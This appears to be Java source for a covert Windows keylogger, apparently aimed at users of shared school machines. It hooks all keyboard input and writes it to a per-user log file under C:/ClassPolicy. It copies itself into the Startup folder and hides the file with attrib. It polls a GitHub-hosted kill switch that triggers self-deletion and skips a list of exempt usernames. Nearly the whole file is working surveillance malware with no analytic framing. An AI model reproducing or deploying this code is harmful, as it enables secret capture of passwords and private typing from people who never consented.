package main;

import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;

public class Main implements NativeKeyListener{
	static Stopwatch robert;
	public Main() {
		robert = new Stopwatch();
	}
	public void exec() throws IOException, URISyntaxException {	
		int version = 1;
		if (getCurrentVersion() > version) {
			System.out.println("[?] A newer version has been released. Downloading version: " + getCurrentVersion());
			// update the code, replace current version with new version. (not done)
		}
		
	//	System.out.println(getHostIP());
		String[] protect = new String[]{"s-duv", "citrus", "s-suzukia","s-tehi", "s-chenb", "s-chenr"};
		 System.out.println("Local_Username: " + System.getProperty("user.name"));
 		for(int fsk = 0; fsk < protect.length; fsk++) {
			 System.out.println(System.getProperty("user.name"));
			if (protect[fsk].matches(System.getProperty("user.name"))) {
				 System.out.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: Acct Status " + fsk);
				 System.exit(0);
			}
		 }
		if (!isWindows()){
			System.out.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: OS is not Windows.");
			System.exit(0);
		}
		if (isSuicune()) {
			System.out.println("[" + robert.elapsedTime() + "] [!] Run Access Denied: Kill Command Received.");
			 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
			cf.deleteOnExit();
			System.exit(0);
		}
		System.out.println("[" + robert.elapsedTime() + "] [✔] Run Access Granted: All safety checks passed.");
		File yiffyiff = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
	//	 System.out.println("Location " + yiffyiff);
		String startup = "C:/Users/" + System.getProperty("user.name") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup";
		 @SuppressWarnings("unused")
		 Process p =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"xcopy.exe" + " \"" + yiffyiff + "\"" + " \"" + startup +"\"");
		 @SuppressWarnings("unused")
		Process px =Runtime.getRuntime().exec(System.getenv("windir") +"\\system32\\"+"attrib.exe +h" + " \"" + yiffyiff + "\"");
		File log = new File("C:/ClassPolicy/" + System.getProperty("user.name") + ".txt");
		if(!log.exists()) {
			System.out.println("Creating logfile...");
			System.out.println("Starting...");
			log.createNewFile();
		} else {
			System.out.println("Starting...");
		}
		System.out.println("[" + robert.elapsedTime() + "] File I/O Established.");
		String fn = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
		PrintWriter timestamper = new PrintWriter(new FileWriter(fn, true));
		timestamper.println();
		timestamper.print("[Startup: " + new SimpleDateFormat("EEEE").format(new Date()) + " +" + getCurrentTimeInBeats() + " ]");
		timestamper.println();
		timestamper.close();
		try {
			GlobalScreen.registerNativeHook();
			System.out.println("[" + robert.elapsedTime() + "] [✔] HookModule Successfully Registered.");
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			System.out.println("["+ robert.elapsedTime() + "][!][FATAL] A NativeHook Exception Occured: " + e);
			e.printStackTrace();
		}
		GlobalScreen.getInstance().addNativeKeyListener(new Main());

		}

	private static boolean isSuicune() {
		try {
			 URL yahoo = new URL("https://github.com/OtakuInSeattle/sites/blob/master/klkillswitch");
	         URLConnection yc = yahoo.openConnection();
	         BufferedReader in = new BufferedReader(new InputStreamReader(
	                 yc.getInputStream(), "UTF-8"));
	         String inputLine;
	         StringBuilder a = new StringBuilder();
	         while ((inputLine = in.readLine()) != null){
	             a.append(inputLine);
	             if(a.toString().contains("yes")) {
	            	 return true;
	             }
	         }
	         System.out.println("NO");
	         return false;
		} catch (Exception e) {
			System.out.println(e);
			return false;
		}
	}
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		//System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
		record(NativeKeyEvent.getKeyText(e.getKeyCode()));
	    // System.out.println("Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
	}
	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// System.out.println("Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
		//if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Enter")) {
		//	System.out.print("\n");
		//} else if (NativeKeyEvent.getKeyText(e.getKeyCode()).matches("Space")) {
		//	System.out.print(" ");
		//} else {
		//	System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
		//}
		}
	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
	}
	public static void record(String x) {
		try {
			String filename = "C:/ClassPolicy/" + System.getProperty("user.name") + ".txt";
			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
			// System.out.println("rec " + x);
			if(x.matches("Space")) {
				out.print(" ");
				out.close();
			} else {
			out.print(x);
			out.close();
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	 public static boolean isWindows() {
		   String OS = System.getProperty("os.name").toLowerCase();
		   return (OS.indexOf("win") >= 0);
		}
	 public static int getCurrentTimeInBeats() {
		    java.util.Calendar cal = java.util.Calendar.getInstance( java.util.TimeZone.getTimeZone( "GMT+01:00" ) );
		    int beats = (int) ( ( cal.get( java.util.Calendar.SECOND ) + ( cal.get( java.util.Calendar.MINUTE ) * 60 ) + ( cal.get( java.util.Calendar.HOUR_OF_DAY ) * 3600 ) ) / 86.4 );
		    return beats;
		}
	 public static int getCurrentVersion() {
		 try {
		 // return version from domain controller, if cant connect return current version
			 return 1;
		 } catch (Exception ee) {
			 return 1;
		 }
	 }
	public static double getElapsedCombatTime() {
		return robert.elapsedTime();
	}
}
